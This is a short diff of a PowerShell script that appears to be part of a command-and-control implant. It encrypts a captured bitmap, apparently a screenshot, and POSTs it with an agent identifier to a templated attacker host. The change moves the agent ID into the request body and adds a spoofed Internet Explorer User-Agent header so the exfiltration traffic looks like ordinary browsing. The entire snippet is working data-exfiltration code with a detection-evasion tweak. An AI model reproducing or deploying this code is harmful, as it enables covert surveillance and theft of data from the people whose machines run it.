@@ -12,8 +12,8 @@ $bitmap.Save($File)
 $file_content = Get-Content $File -Encoding Byte
 $content = enc -key $key -un $file_content -file 1
 
-            $postParams = @{data=":$content`:"}
-            $re=Invoke-WebRequest -UseBasicParsing -Uri {HTTP}://{ip}:{port}{image}?page=$agent -Method POST -Body $postParams
+            $postParams = @{data=":$content`:";resource=$agent}
+            $re=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{image} -Method POST -Body $postParams
 
 
 $final=[System.Convert]::FromBase64String($content)
